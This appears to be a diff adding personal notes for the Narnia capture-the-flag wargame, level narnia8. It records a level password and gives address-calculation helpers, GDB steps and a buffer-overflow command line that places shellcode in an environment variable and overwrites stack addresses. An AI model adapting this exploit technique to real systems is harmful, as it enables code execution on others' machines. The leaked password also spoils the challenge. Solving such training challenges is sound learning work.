@@ -1,0 +1,24 @@
+pass: mohthuphog
+
+
+def get_blah_addr(strlen): 
+    root = 0xffffdfb3
+    return hex((root) - strlen)
+
+
+def get_shellcode_start_addr(env_start_addr):
+	return hex(env_start_addr + len('shellcode='))
+
+
+# To get env address.
+x/s *((char**)environ)
+
+# GDB
+env -i shellcode=$(cat /tmp/xecute) PWD=$PWD gdb -q /narnia/narnia8
+unset env LINES
+unset env COLUMNS
+break *0x8048485
+r $(python -c "print 'A' * 20 + '\x93\xdf\xff\xff' + 'A' * 4 + '\xbe\xdf\xff\xff'")
+
+# Normal
+env -i shellcode=$(cat /tmp/xecute) PWD=$PWD /narnia/narnia8 $(python -c "print 'A' * 20 + '\x93\xdf\xff\xff' + 'A' * 4 + '\xbe\xdf\xff\xff'")
